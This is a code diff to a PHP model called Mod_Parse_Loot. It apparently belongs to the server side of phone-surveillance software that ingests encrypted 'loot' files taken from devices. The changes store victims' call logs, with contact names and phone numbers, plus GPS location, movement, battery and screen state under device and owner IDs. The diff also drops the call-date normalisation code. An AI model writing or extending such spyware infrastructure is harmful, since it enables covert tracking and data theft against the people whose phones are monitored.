@@ -146,22 +146,12 @@ class Mod_Parse_Loot extends Model
                 continue; // Skip invalid
             }
 
-                if (is_numeric($log['call_date'])) {
-                     // Check if it's milliseconds (length > 10 usually means ms)
-                     if (strlen((string)$log['call_date']) > 10) {
-                        $call_date = date('Y-m-d H:i:s', substr((string)$log['call_date'], 0, 10)); 
-                     } else {
-                        $call_date = date('Y-m-d H:i:s', $log['call_date']);
-                     }
-                } else {
-                    $call_date = $log['call_date'];
-                }
-
                 $logData = [
                     'contact_name'       => $log['contact_name'] ?? null,
                     'phone_number'       => $log['phone_number'],
                     'call_type'          => $log['call_type'] ?? 'Unknown',
-                    'call_date'          => $call_date,
+//                    'call_date'          => $call_date,
+                    'call_date'          => $log['call_date'],
                     'duration_seconds'   => $log['duration_seconds'] ?? 0,
                     'formatted_duration' => $log['formatted_duration'] ?? '',
                     'device_id'          => $var_file_print,
@@ -569,4 +559,98 @@ class Mod_Parse_Loot extends Model
         }
     }
 
+    /**
+     * Parses and inserts location and activity data from modern JSON file.
+     *
+     * @param string $file_name
+     * @param int $var_file_owner
+     * @param string $var_file_print
+     * @param int|null $fileRecordId
+     * @return bool|int Record count or false
+     */
+    public function get_location(string $file_name, int $var_file_owner, string $var_file_print, int $fileRecordId = null)
+    {
+        try {
+            $cryptModel = new Mod_Crypt();
+            $dated = date('Y-m-d H:i:s');
+
+            $loot_data = file_get_contents(WRITEPATH . 'uploads/text_dump/' . $file_name);
+            if ($loot_data === false) {
+                log_message('error', 'Failed to read file: ' . $file_name);
+                return false;
+            }
+
+            $loot_decoded = $cryptModel->decode_content($loot_data);
+            if ($loot_decoded === false) {
+                log_message('error', 'Failed to decode file: ' . $file_name);
+                return false;
+            }
+
+            $json = json_decode($loot_decoded, true);
+            if ($json === null) {
+                log_message('error', 'Invalid JSON in location file: ' . $file_name);
+                return false;
+            }
+
+            $extracted_at = $json['extracted_at'] ?? null;
+            $recordsInserted = 0;
+
+            // 1. Process Location Data
+            if (isset($json['location'])) {
+                $loc = $json['location'];
+                $locationData = [
+                    'owner_id'      => $var_file_owner,
+                    'device_id'     => $var_file_print,
+                    'latitude'      => $loc['latitude'] ?? null,
+                    'longitude'     => $loc['longitude'] ?? null,
+                    'accuracy'      => $loc['accuracy'] ?? null,
+                    'altitude'      => $loc['altitude'] ?? null,
+                    'bearing'       => $loc['bearing'] ?? null,
+                    'speed'         => $loc['speed'] ?? null,
+                    'provider'      => $loc['provider'] ?? null,
+                    'location_time' => $loc['time'] ?? null,
+                    'status'        => $loc['status'] ?? ($loc['latitude'] ? 'success' : 'no_location_found'),
+                    'extracted_at'  => $extracted_at,
+                    'created_at'    => $dated,
+                    'updated_at'    => $dated
+                ];
+
+                if ($this->db->table('tbl_location')->insert($locationData)) {
+                    $recordsInserted++;
+                }
+            }
+
+            // 2. Process Activity Data
+            if (isset($json['activity'])) {
+                $act = $json['activity'];
+                $activityData = [
+                    'owner_id'       => $var_file_owner,
+                    'device_id'      => $var_file_print,
+                    'status'         => $act['status'] ?? 'feature_not_fully_implemented',
+                    'activity_type'  => $act['activity_type'] ?? null,
+                    'confidence'     => $act['confidence'] ?? 0,
+                    'info'           => $act['info'] ?? null,
+                    'is_interactive' => isset($act['is_interactive']) ? ($act['is_interactive'] ? 1 : 0) : 0,
+                    'battery_level'  => $act['battery_level'] ?? null,
+                    'charging_status'=> $act['charging_status'] ?? null,
+                    'network_type'   => $act['network_type'] ?? null,
+                    'screen_on'      => isset($act['screen_on']) ? ($act['screen_on'] ? 1 : 0) : 0,
+                    'extracted_at'   => $extracted_at,
+                    'activity_time'  => $act['activity_time'] ?? null,
+                    'created_at'     => $dated,
+                    'updated_at'     => $dated
+                ];
+
+                if ($this->db->table('tbl_activity')->insert($activityData)) {
+                    $recordsInserted++;
+                }
+            }
+
+            return $recordsInserted;
+
+        } catch (\Exception $e) {
+            log_message('error', 'get_location exception: ' . $e->getMessage());
+            return false;
+        }
+    }
 }
